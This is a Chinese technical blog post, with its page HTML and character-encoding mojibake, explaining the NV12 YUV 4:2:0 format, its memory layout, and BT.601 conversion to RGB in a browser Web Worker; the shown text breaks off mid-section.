            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3606845069731848/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ‚ å“‰æ‘¸é±¼å¤§ç‹
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T07:48:15.000Z" title="Thu Jan 08 2026 07:48:15 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    15
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»8åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å‰è¨€</h2>
<p>ç”±äºæµè§ˆå™¨æ— æ³•ç›´æ¥æ˜¾ç¤º NV12 æ ¼å¼ï¼Œéœ€è¦è½¬æ¢ä¸º RGB æ‰èƒ½åœ¨ Canvas æˆ– Image ä¸­æ˜¾ç¤ºã€‚</p>
<h2 data-id="heading-1">åŸºç¡€æ¦‚å¿µ</h2>
<h3 data-id="heading-2">ä»€ä¹ˆæ˜¯ YUVï¼Ÿ</h3>
<p>YUV æ˜¯ä¸€ç§é¢œè‰²ç¼–ç ç³»ç»Ÿï¼Œä¸ RGB ä¸åŒï¼š</p>
<ul>
<li><strong>Yï¼ˆäº®åº¦ï¼‰</strong> ï¼šè¡¨ç¤ºå›¾åƒçš„æ˜æš—ç¨‹åº¦ï¼Œäººçœ¼å¯¹äº®åº¦æœ€æ•æ„Ÿ</li>
<li><strong>Uï¼ˆè‰²åº¦ï¼‰</strong> ï¼šè¡¨ç¤ºè“è‰²ä¸äº®åº¦çš„å·®å€¼</li>
<li><strong>Vï¼ˆè‰²åº¦ï¼‰</strong> ï¼šè¡¨ç¤ºçº¢è‰²ä¸äº®åº¦çš„å·®å€¼</li>
</ul>
<h3 data-id="heading-3">ä»€ä¹ˆæ˜¯ NV12ï¼Ÿ</h3>
<p>NV12 æ˜¯ YUV æ ¼å¼çš„ä¸€ç§ï¼Œé‡‡ç”¨ <strong>4:2:0 é‡‡æ ·</strong>ï¼š</p>
<ul>
<li><strong>4:2:0</strong> è¡¨ç¤ºï¼šæ¯ 4 ä¸ª Y åƒç´ å…±äº« 1 ä¸ª UV åƒç´ å¯¹</li>
<li><strong>å­˜å‚¨æ–¹å¼</strong>ï¼šY å¹³é¢å®Œæ•´å­˜å‚¨ï¼ŒUV å¹³é¢äº¤é”™å­˜å‚¨ï¼ˆUã€Vã€Uã€V...ï¼‰</li>
<li><strong>æ•°æ®å¤§å°</strong>ï¼š<code>width Ã— height Ã— 1.5</code> å­—èŠ‚</li>
</ul>
<h3 data-id="heading-4">RGB vs YUV vs NV12</h3>





























<table><thead><tr><th>æ ¼å¼</th><th>æ•°æ®å¤§å°</th><th>ç”¨é€”</th><th>æµè§ˆå™¨æ”¯æŒ</th></tr></thead><tbody><tr><td>RGB</td><td><code>width Ã— height Ã— 3</code></td><td>æ˜¾ç¤ºã€ç¼–è¾‘</td><td>âœ… åŸç”Ÿæ”¯æŒ</td></tr><tr><td>YUV</td><td>å¤šç§å˜ä½“</td><td>è§†é¢‘ç¼–ç </td><td>âŒ éœ€è¦è½¬æ¢</td></tr><tr><td>NV12</td><td><code>width Ã— height Ã— 1.5</code></td><td>è§†é¢‘å¤„ç†</td><td>âŒ éœ€è¦è½¬æ¢</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-5">NV12 æ ¼å¼è¯¦è§£</h2>
<h3 data-id="heading-6">æ•°æ®å¸ƒå±€</h3>
<p>NV12 æ•°æ®ç”±ä¸¤éƒ¨åˆ†ç»„æˆï¼š</p>
<pre><code class="hljs language-arduino" lang="arduino">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  Y å¹³é¢ï¼ˆäº®åº¦ï¼‰ Â  Â  Â  Â  Â  Â  Â  Â   â”‚
â”‚  å¤§å°ï¼šwidth Ã— height å­—èŠ‚ Â  Â  Â  â”‚
â”‚  æ¯ä¸ªåƒç´  <span class="hljs-number">1</span> å­—èŠ‚ Â  Â  Â  Â  Â  Â  Â  Â  â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚  UV å¹³é¢ï¼ˆè‰²åº¦ï¼Œäº¤é”™å­˜å‚¨ï¼‰ Â  Â  Â  â”‚
â”‚  å¤§å°ï¼šwidth Ã— height / <span class="hljs-number">2</span> å­—èŠ‚ Â  â”‚
â”‚  æ ¼å¼ï¼šU V U V U V ... Â  Â  Â  Â   â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
â€‹
æ€»å¤§å° = width Ã— height Ã— <span class="hljs-number">1.5</span> å­—èŠ‚
</code></pre>
<h3 data-id="heading-7">ç¤ºä¾‹ï¼š1920Ã—1080 å›¾åƒ</h3>
<pre><code class="hljs language-ini" lang="ini">Y å¹³é¢ï¼š1920 Ã— <span class="hljs-attr">1080</span> = <span class="hljs-number">2</span>,<span class="hljs-number">073</span>,<span class="hljs-number">600</span> å­—èŠ‚
UV å¹³é¢ï¼š1920 Ã— 1080 / <span class="hljs-attr">2</span> = <span class="hljs-number">1</span>,<span class="hljs-number">036</span>,<span class="hljs-number">800</span> å­—èŠ‚
æ€»å¤§å°ï¼š3,110,400 å­—èŠ‚
â€‹
æ•°æ®æ’åˆ—ï¼š
<span class="hljs-section">[Y Y Y Y ... Y]</span> <span class="hljs-section">[U V U V U V ... U V]</span>
 â†‘ 2,073,600 å­—èŠ‚  â†‘ 1,036,800 å­—èŠ‚
</code></pre>
<h3 data-id="heading-8">4:2:0 é‡‡æ ·è¯´æ˜</h3>
<pre><code class="hljs language-csharp" lang="csharp">åƒç´ å¸ƒå±€ï¼ˆ<span class="hljs-number">2</span>Ã—<span class="hljs-number">2</span> åƒç´ å—ï¼‰ï¼š
â”Œâ”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”
â”‚ Yâ‚  â”‚ Yâ‚‚  â”‚  â† <span class="hljs-number">4</span> ä¸ª Y å€¼
â”œâ”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”¤
â”‚ Yâ‚ƒ  â”‚ Yâ‚„  â”‚
â””â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”˜
 Â  Â  â†“
  å…±äº« <span class="hljs-number">1</span> ä¸ª UV å¯¹
 Â  Â  â†“
 Â  [<span class="hljs-meta">U, V</span>]
</code></pre>
<p><strong>ä¸ºä»€ä¹ˆè¿™æ ·è®¾è®¡ï¼Ÿ</strong></p>
<ul>
<li>äººçœ¼å¯¹äº®åº¦ï¼ˆYï¼‰æ›´æ•æ„Ÿï¼Œå¯¹è‰²åº¦ï¼ˆUVï¼‰ä¸æ•æ„Ÿ</li>
<li>å‡å°‘è‰²åº¦æ•°æ®å¯ä»¥èŠ‚çœ 50% å­˜å‚¨ç©ºé—´</li>
<li>è§†é¢‘ç¼–ç æ ‡å‡†ï¼ˆH.264/H.265ï¼‰åŸºäºæ­¤åŸç†</li>
</ul>
<hr/>
<h2 data-id="heading-9">ä½¿ç”¨åœºæ™¯</h2>
<h3 data-id="heading-10">1. è§†é¢‘ç¼–ç /è§£ç </h3>
<p>è§†é¢‘ç¼–è§£ç å™¨ï¼ˆH.264ã€H.265/HEVCã€VP8ã€VP9ï¼‰çš„ä¸­é—´æ ¼å¼ï¼š</p>
<pre><code class="hljs">è§†é¢‘æ–‡ä»¶ â†’ è§£ç å™¨ â†’ NV12 æ ¼å¼å¸§ â†’ è½¬æ¢ä¸º RGB â†’ æ˜¾ç¤º
</code></pre>
<h3 data-id="heading-11">2. æ‘„åƒå¤´/è§†é¢‘æµ</h3>
<p>æ‘„åƒå¤´é‡‡é›†çš„åŸå§‹æ•°æ®é€šå¸¸æ˜¯ YUVï¼ˆNV12 æ˜¯å…¶ä¸­ä¸€ç§ï¼‰ï¼š</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment">// WebRTC ç¤ºä¾‹</span>
<span class="hljs-keyword">const</span> stream = <span class="hljs-keyword">await</span> navigator.mediaDevices.getUserMedia({ video: <span class="hljs-literal">true</span> })
<span class="hljs-keyword">const</span> videoTrack = stream.getVideoTracks()[<span class="hljs-number">0</span>]
<span class="hljs-keyword">const</span> imageCapture = <span class="hljs-keyword">new</span> ImageCapture(videoTrack)
<span class="hljs-comment">// æŸäº› API å¯èƒ½è¿”å› NV12 æ ¼å¼çš„åŸå§‹æ•°æ®</span>
</code></pre>
<h3 data-id="heading-12">3. WebRTC è§†é¢‘å¤„ç†</h3>
<ul>
<li>WebRTC çš„ <code>VideoFrame</code> API å¯èƒ½æä¾› NV12 æ ¼å¼</li>
<li>è§†é¢‘ä¼šè®®ã€ç›´æ’­ç­‰åœºæ™¯ä¸­çš„åŸå§‹å¸§æ•°æ®</li>
</ul>
<h3 data-id="heading-13">4. ç§»åŠ¨ç«¯å¼€å‘</h3>
<ul>
<li><strong>Android</strong>ï¼šCamera2 API è¾“å‡ºçš„æ ¼å¼ä¹‹ä¸€ï¼ˆ<code>ImageFormat.YUV_420_888</code>ï¼‰</li>
<li><strong>iOS</strong>ï¼šVideoToolbox å¯èƒ½è¾“å‡º NV12</li>
<li>ç§»åŠ¨ç«¯è§†é¢‘å¤„ç†åº“çš„å¸¸è§è¾“å‡ºæ ¼å¼</li>
</ul>
<h3 data-id="heading-14">5. FFmpeg/è§†é¢‘å¤„ç†åº“</h3>
<pre><code class="hljs language-css" lang="css"># FFmpeg å¤„ç†è§†é¢‘æ—¶ç»å¸¸ä½¿ç”¨ NV12
ffmpeg -<span class="hljs-selector-tag">i</span> <span class="hljs-selector-tag">input</span><span class="hljs-selector-class">.mp4</span> -pix_fmt nv12 output<span class="hljs-selector-class">.nv12</span>
</code></pre>
<h3 data-id="heading-15">6. ç¡¬ä»¶åŠ é€Ÿ</h3>
<ul>
<li>GPU è§†é¢‘è§£ç å™¨ï¼ˆNVIDIA NVENCã€Intel Quick Syncï¼‰çš„è¾“å‡º</li>
<li>ç¡¬ä»¶ç¼–ç å™¨é€šå¸¸ä½¿ç”¨ NV12 ä½œä¸ºè¾“å…¥/è¾“å‡ºæ ¼å¼</li>
</ul>
<hr/>
<h2 data-id="heading-16">ä¸ºä»€ä¹ˆé€‰æ‹© NV12</h2>
<h3 data-id="heading-17">1. å­˜å‚¨æ•ˆç‡</h3>
<p><strong>å¯¹æ¯”ï¼š</strong></p>
<pre><code class="hljs language-ini" lang="ini">1920 Ã— 1080 å›¾åƒï¼š
â€‹
RGBï¼š1920 Ã— 1080 Ã— <span class="hljs-attr">3</span> = <span class="hljs-number">6</span>,<span class="hljs-number">220</span>,<span class="hljs-number">800</span> å­—èŠ‚
NV12ï¼š1920 Ã— 1080 Ã— <span class="hljs-attr">1.5</span> = <span class="hljs-number">3</span>,<span class="hljs-number">110</span>,<span class="hljs-number">400</span> å­—èŠ‚
â€‹
èŠ‚çœï¼š50% å­˜å‚¨ç©ºé—´
</code></pre>
<h3 data-id="heading-18">2. ç¡¬ä»¶æ”¯æŒ</h3>
<ul>
<li>å¤§å¤šæ•°ç¡¬ä»¶ç¼–ç å™¨åŸç”Ÿæ”¯æŒ NV12</li>
<li>è½¬æ¢æˆæœ¬ä½ï¼Œæ€§èƒ½å¥½</li>
</ul>
<h3 data-id="heading-19">3. è§†é¢‘ç¼–ç æ ‡å‡†</h3>
<ul>
<li>ä¸»æµè§†é¢‘ç¼–ç æ ‡å‡†ï¼ˆH.264ã€H.265ï¼‰åŸºäº YUV</li>
<li>NV12 æ˜¯å¸¸è§çš„ YUV æ ¼å¼ï¼Œå…¼å®¹æ€§å¥½</li>
</ul>
<h3 data-id="heading-20">4. äººçœ¼ç‰¹æ€§</h3>
<ul>
<li>äººçœ¼å¯¹äº®åº¦ï¼ˆYï¼‰æ•æ„Ÿï¼Œå¯¹è‰²åº¦ï¼ˆUVï¼‰ä¸æ•æ„Ÿ</li>
<li>4:2:0 é‡‡æ ·ç¬¦åˆäººçœ¼ç‰¹æ€§ï¼Œåœ¨è§†è§‰è´¨é‡æŸå¤±å¾ˆå°çš„æƒ…å†µä¸‹å¤§å¹…å‡å°‘æ•°æ®é‡</li>
</ul>
<hr/>
<h2 data-id="heading-21">è½¬æ¢åŸç†</h2>
<h3 data-id="heading-22">YUV â†’ RGB è½¬æ¢å…¬å¼</h3>
<p>æˆ‘ä»¬ä½¿ç”¨ <strong>ITU-R BT.601</strong> æ ‡å‡†çš„è½¬æ¢å…¬å¼ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">// æ ‡å‡†å…¬å¼ï¼ˆæµ®ç‚¹ï¼‰
<span class="hljs-attr">R</span> = Y + <span class="hljs-number">1.402</span> Ã— (V - <span class="hljs-number">128</span>)
<span class="hljs-attr">G</span> = Y - <span class="hljs-number">0.344</span> Ã— (U - <span class="hljs-number">128</span>) - <span class="hljs-number">0.714</span> Ã— (V - <span class="hljs-number">128</span>)
<span class="hljs-attr">B</span> = Y + <span class="hljs-number">1.772</span> Ã— (U - <span class="hljs-number">128</span>)
â€‹
// ä¼˜åŒ–åçš„æ•´æ•°è¿ç®—ï¼ˆä»£ç ä¸­ä½¿ç”¨ï¼‰
let <span class="hljs-attr">r</span> = y + ((<span class="hljs-number">359</span> * v + <span class="hljs-number">128</span>) &gt;&gt; <span class="hljs-number">8</span>) Â  Â  Â // <span class="hljs-number">1.402</span> â‰ˆ <span class="hljs-number">359</span>/<span class="hljs-number">256</span>
let <span class="hljs-attr">g</span> = y - ((<span class="hljs-number">88</span> * u + <span class="hljs-number">183</span> * v + <span class="hljs-number">128</span>) &gt;&gt; <span class="hljs-number">8</span>) Â // <span class="hljs-number">0.344</span>â‰ˆ<span class="hljs-number">88</span>/<span class="hljs-number">256</span>, <span class="hljs-number">0.714</span>â‰ˆ<span class="hljs-number">183</span>/<span class="hljs-number">256</span>
let <span class="hljs-attr">b</span> = y + ((<span class="hljs-number">454</span> * u + <span class="hljs-number">128</span>) &gt;&gt; <span class="hljs-number">8</span>) Â  Â  Â // <span class="hljs-number">1.772</span> â‰ˆ <span class="hljs-number">454</span>/<span class="hljs-number">256</span>
â€‹
// é™åˆ¶å€¼åœ¨ 0-255 èŒƒå›´å†…
<span class="hljs-attr">r</span> = r &lt; <span class="hljs-number">0</span> ? <span class="hljs-number">0</span> : r &gt; <span class="hljs-number">255</span> ? <span class="hljs-number">255</span> : r
<span class="hljs-attr">g</span> = g &lt; <span class="hljs-number">0</span> ? <span class="hljs-number">0</span> : g &gt; <span class="hljs-number">255</span> ? <span class="hljs-number">255</span> : g
<span class="hljs-attr">b</span> = b &lt; <span class="hljs-number">0</span> ? <span class="hljs-number">0</span> : b &gt; <span class="hljs-number">255</span> ? <span class="hljs-number">255</span> : b
</code></pre>
<p><strong>ä¸ºä»€ä¹ˆä½¿ç”¨æ•´æ•°è¿ç®—ï¼Ÿ</strong></p>
<ul>
<li><code>&gt;&gt; 8</code> ç›¸å½“äºé™¤ä»¥ 256ï¼Œæ¯”æµ®ç‚¹è¿ç®—å¿«</li>
<li>é¿å…æµ®ç‚¹æ•°ç²¾åº¦é—®é¢˜</li>
<li>æ€§èƒ½æ›´å¥½</li>
</ul>
<h3 data-id="heading-23">è½¬æ¢æµç¨‹</h3>
<pre><code class="hljs language-arduino" lang="arduino">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  NV12 åŸå§‹æ•°æ®  â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”˜
 Â  Â  Â  Â  â”‚
 Â  Â  Â  Â  â–¼
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  æå– Y å¹³é¢ Â   â”‚  â† width Ã— height å­—èŠ‚
â”‚  ï¼ˆäº®åº¦ä¿¡æ¯ï¼‰ Â   â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”˜
 Â  Â  Â  Â  â”‚
 Â  Â  Â  Â  â–¼
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  æå– UV å¹³é¢ Â  â”‚  â† width Ã— height / <span class="hljs-number">2</span> å­—èŠ‚
â”‚  ï¼ˆè‰²åº¦ï¼Œäº¤é”™ï¼‰  â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”˜
 Â  Â  Â  Â  â”‚
 Â  Â  Â  Â  â–¼
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  å¯¹æ¯ä¸ªåƒç´ ï¼š Â   â”‚
â”‚  <span class="hljs-number">1.</span> è®¡ç®— UV ç´¢å¼•â”‚  â† <span class="hljs-number">4</span>:<span class="hljs-number">2</span>:<span class="hljs-number">0</span> é‡‡æ ·æ˜ å°„
â”‚  <span class="hljs-number">2.</span> åº”ç”¨è½¬æ¢å…¬å¼â”‚  â† YUV â†’ RGB
â”‚  <span class="hljs-number">3.</span> é™åˆ¶å€¼èŒƒå›´  â”‚  â† <span class="hljs-number">0</span><span class="hljs-number">-255</span> clamp
â””â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”˜
 Â  Â  Â  Â  â”‚
 Â  Â  Â  Â  â–¼
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  ç”Ÿæˆ RGBA æ•°æ® â”‚  â† width Ã— height Ã— <span class="hljs-number">4</span> å­—èŠ‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”˜
 Â  Â  Â  Â  â”‚
 Â  Â  Â  Â  â–¼
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  ç»˜åˆ¶åˆ° Canvas  â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</code></pre>
<h3 data-id="heading-24">UV ç´¢å¼•è®¡ç®—è¯¦è§£</h3>
<p>è¿™æ˜¯è½¬æ¢ä¸­æœ€å…³é”®çš„éƒ¨åˆ†ï¼š</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-comment">// å¯¹äºåƒç´ ä½ç½® (x, y)ï¼Œè®¡ç®—å…¶åœ¨æ•°ç»„ä¸­çš„ç´¢å¼•</span>
<span class="hljs-type">const</span> i = y * width + x
â€‹
<span class="hljs-comment">// è®¡ç®—å¯¹åº”çš„ UV è¡Œï¼ˆ4:2:0 é‡‡æ ·ï¼ŒUV è¡Œæ˜¯ Y è¡Œçš„ä¸€åŠï¼‰</span>
<span class="hljs-type">const</span> uvRow = (i / width | <span class="hljs-number">0</span>) &gt;&gt; <span class="hljs-number">1</span> Â <span class="hljs-comment">// ç­‰ä»·äº Math.floor(y / 2)</span>
â€‹
<span class="hljs-comment">// è®¡ç®—å¯¹åº”çš„ UV åˆ—ï¼ˆå¿…é¡»æ˜¯å¶æ•°ï¼‰</span>
<span class="hljs-type">const</span> uvCol = (i % width) &amp; ~<span class="hljs-number">1</span> Â  Â  Â  <span class="hljs-comment">// ç­‰ä»·äº Math.floor(x / 2) * 2</span>
â€‹
<span class="hljs-comment">// è®¡ç®— UV åœ¨æ•°ç»„ä¸­çš„ç´¢å¼•</span>
<span class="hljs-type">const</span> uvIndex = uvRow * width + uvCol
â€‹
<span class="hljs-comment">// è·å– U å’Œ V å€¼</span>
<span class="hljs-type">const</span> u = uv[uvIndex] - <span class="hljs-number">128</span> Â  Â  Â <span class="hljs-comment">// U å€¼ï¼ˆåç§» 128ï¼‰</span>
<span class="hljs-type">const</span> v = uv[uvIndex + <span class="hljs-number">1</span>] - <span class="hljs-number">128</span> Â <span class="hljs-comment">// V å€¼ï¼ˆåç§» 128ï¼‰</span>
</code></pre>
<p><strong>ç¤ºä¾‹ï¼šåƒç´  (100, 50) åœ¨ 1920Ã—1080 å›¾åƒä¸­</strong></p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">i</span> = <span class="hljs-number">50</span> * <span class="hljs-number">1920</span> + <span class="hljs-number">100</span> = <span class="hljs-number">96</span>,<span class="hljs-number">100</span>
<span class="hljs-attr">uvRow</span> = (<span class="hljs-number">96</span>,<span class="hljs-number">100</span> / <span class="hljs-number">1920</span>) &gt;&gt; <span class="hljs-number">1</span> = <span class="hljs-number">25</span>
<span class="hljs-attr">uvCol</span> = (<span class="hljs-number">96</span>,<span class="hljs-number">100</span> % <span class="hljs-number">1920</span>) &amp; ~<span class="hljs-number">1</span> = <span class="hljs-number">100</span>
<span class="hljs-attr">uvIndex</span> = <span class="hljs-number">25</span> * <span class="hljs-number">1920</span> + <span class="hljs-number">100</span> = <span class="hljs-number">48</span>,<span class="hljs-number">100</span>
â€‹
// è¯»å– UV å€¼
<span class="hljs-attr">u</span> = uv[<span class="hljs-number">48</span>,<span class="hljs-number">100</span>] - <span class="hljs-number">128</span>
<span class="hljs-attr">v</span> = uv[<span class="hljs-number">48</span>,<span class="hljs-number">101</span>] - <span class="hljs-number">128</span>
</code></pre>
<hr/>
<h2 data-id="heading-25">å®ç°ç»†èŠ‚</h2>
<h3 data-id="heading-26">ä¸ºä»€ä¹ˆä½¿ç”¨ Web Workerï¼Ÿ</h3>
<p>è½¬æ¢æ˜¯ <strong>CPU å¯†é›†å‹æ“ä½œ</strong>ï¼š</p>
<pre><code class="hljs language-diff" lang="diff">1920 Ã— 1080 å›¾åƒ = 2,073,600 åƒç´ 
â€‹
æ¯ä¸ªåƒç´ éœ€è¦ï¼š
<span class="hljs-deletion">- 1 æ¬¡ Y å€¼è¯»å–</span>
<span class="hljs-deletion">- 1 æ¬¡ UV ç´¢å¼•è®¡ç®—</span>
<span class="hljs-deletion">- 1 æ¬¡ UV å€¼è¯»å–</span>
<span class="hljs-deletion">- 3 æ¬¡ä¹˜æ³•è¿ç®—</span>
<span class="hljs-deletion">- 3 æ¬¡åŠ æ³•è¿ç®—</span>
<span class="hljs-deletion">- 3 æ¬¡ clamp æ“ä½œ</span>
â€‹
æ€»è®¡ï¼šçº¦ 2,000 ä¸‡æ¬¡è¿ç®—
</code></pre>
<p><strong>åœ¨ä¸»çº¿ç¨‹æ‰§è¡Œçš„é—®é¢˜ï¼š</strong></p>
<ul>
<li>âŒ é˜»å¡ UIï¼Œé¡µé¢å¡é¡¿</li>
<li>âŒ ç”¨æˆ·ä½“éªŒå·®</li>
<li>âŒ æ— æ³•åˆ©ç”¨å¤šæ ¸ CPU</li>
</ul>
<p><strong>ä½¿ç”¨ Web Worker çš„ä¼˜åŠ¿ï¼š</strong></p>
<ul>
<li>âœ… åå°å¤„ç†ï¼Œä¸é˜»å¡ UI</li>
<li>âœ… åˆ©ç”¨å¤šæ ¸ CPU</li>
<li>âœ… æ›´å¥½çš„ç”¨æˆ·ä½“éªŒ</li>
</ul>
<h3 data-id="heading-27">ä¸ºä»€ä¹ˆéœ€è¦æå‰çŸ¥é“å›¾ç‰‡çš„å®½é«˜ï¼Ÿ</h3>
<h4 data-id="heading-28">1. æ²¡æœ‰æ–‡ä»¶å¤´/å…ƒæ•°æ®</h4>
<p>NV12 æ–‡ä»¶æ˜¯çº¯åƒç´ æ•°æ®ï¼Œä¸åƒå¸¸è§å›¾ç‰‡æ ¼å¼åŒ…å«å…ƒæ•°æ®ï¼š</p>
<pre><code class="hljs">PNG/JPEG æ–‡ä»¶ç»“æ„ï¼š
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  æ–‡ä»¶å¤´ Â  Â  â”‚ â† åŒ…å«å®½é«˜ã€æ ¼å¼ç­‰ä¿¡æ¯
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚  å…ƒæ•°æ® Â  Â  â”‚ â† é¢œè‰²ç©ºé—´ã€å‹ç¼©å‚æ•°ç­‰
